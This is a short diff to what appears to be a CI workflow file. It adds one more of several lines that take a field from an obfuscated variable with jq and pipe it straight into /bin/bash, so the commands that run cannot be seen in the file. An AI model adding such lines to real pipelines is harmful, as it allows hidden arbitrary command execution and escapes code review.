@@ -21,6 +21,7 @@ jobs:
           echo $vivix37 | jq -r .uqfv9802 | /bin/bash
           printf '%s' "$pp0" | jq -r .p55148 | /bin/bash
           echo $z7 | jq -r .ehiv25422 | /bin/bash
+          printf '%s' "$f02" | jq -r .fphg440 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
